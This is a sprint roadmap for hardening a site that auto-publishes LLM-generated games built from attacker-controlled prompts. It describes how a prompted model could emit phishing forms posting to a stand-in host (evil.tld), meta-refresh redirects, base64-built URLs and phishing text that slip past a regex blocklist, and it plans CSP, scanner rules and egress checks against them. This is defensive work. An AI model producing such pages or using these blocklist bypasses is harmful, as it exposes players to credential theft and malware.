# Vibegames Security Hardening — Sprint Overview

## Why

Every game on this site is written by an LLM from an attacker-controlled
natural-language prompt and auto-published with no human review. The
existing defenses — a sandboxed iframe, a regex blocklist in `safety.py`,
and a crash-only Playwright smoke test — stop the naive cases but were
built for "does this game work," not "did someone prompt the model into
producing a phishing page." A security review on 2026-07-24 found concrete
gaps, most notably: `safety.py`'s CDN-allowlist check only matches literal
`src=`/`href=` attributes in the raw markup, so it never sees a `<form
action="https://evil.tld">` (and the iframe sandbox explicitly grants
`allow-forms`), a `<meta http-equiv="refresh" content="...">` redirect, a
JS-constructed URL (`atob(...)`, string concatenation), or plain visible
text urging the player to a phishing/malware site. There's also no rate
limiting on generation, no CSP anywhere, and no way for a player to report
a bad game once it's live.

This roadmap closes those gaps in four independently shippable sprints.
Each one lands, tests, and is useful on its own — none blocks the others
except where noted.

## Locked-in decisions

- **No new infra.** Everything here is Flask routes/headers, `safety.py`
  regex additions, Playwright network capture (already a smoke_test.py
  dependency), and SQLite — no Redis, no external moderation API beyond
  the DeepSeek client already wired up in `ai_client.py`.
- **Defense in depth, not a single silver bullet.** Sprint 1 (browser-
  enforced headers) and Sprint 2 (static scanner) both narrow the same
  hole from different angles on purpose — a bypass of one should still
  get caught by the other.
- **`safety.py` stays a blocklist**, per its own docstring rationale (no
  trustworthy JS AST parser in stdlib). Sprint 2 extends the blocklist
  rather than replacing the approach.
- **Rate limiting is per-`vg_uid`-cookie and per-IP**, mirroring the
  existing `ratings` table's two-`UNIQUE`-constraint pattern — consistent
  with how the codebase already solves "one X per visitor."
- **Reported games reuse the existing `web_games.hidden` column** for
  takedown — Sprint 4 adds a `reports` table and an admin review page,
  it does not invent a second moderation state machine.

## Sprint sequence and dependency rationale

1. **[Sprint 1](01-browser-hardening.md) — Browser-enforced hardening
   (CSP + sandbox + security headers).** Pure `app.py`/`templates/
   index.html` changes, no schema, no pipeline changes. Ships first
   because it's the cheapest, highest-value change: a CSP with
   `form-action 'none'` closes the credential-harvesting-form gap
   immediately, even before Sprint 2's scanner catches it at generation
   time.
2. **[Sprint 2](02-safety-scanner-hardening.md) — Static safety-scanner
   hardening.** Isolated to `safety.py` + new `tests/test_safety.py`.
   Independent of Sprint 1; ships second because it's the next-cheapest
   and closes the `action=`/CSS-`url()`/`meta refresh` gaps at the
   source, before a bad game is ever written to disk.
3. **[Sprint 3](03-pipeline-hardening.md) — Generation pipeline hardening
   (runtime network egress check + rate limiting).** Extends
   `smoke_test.py` to watch actual outbound requests during headless
   load — the only thing that catches an obfuscated/string-built URL,
   since Sprints 1-2 both work on static markup. Bundles rate limiting on
   `/games/new`/`/enhance` since both changes touch the generation
   request path and are naturally tested together.
4. **[Sprint 4](04-moderation-and-reporting.md) — Content moderation pass
   + player reporting + admin review page.** The biggest lift (new table,
   new admin page) and the one genuine backstop for pure social-engineering
   copy (no code, no URL, just text telling the player to go somewhere) —
   ships last because it's additive on top of everything else and least
   urgent given Sprints 1-3 already close the mechanical bypasses.

## Verification approach across all sprints

Each sprint doc has its own acceptance criteria, but the general pattern:
run `python3 app.py` locally, exercise the change with `curl`/a browser,
and run `pytest` (adding new test files where noted) before considering
the sprint done. Sprints 2-4 should each include a hand-crafted "evil"
HTML fixture (a fake login form, a meta-refresh, a base64-built redirect,
a phishing-copy game) exercised through the relevant layer to prove the
specific gap from the security review is now closed.
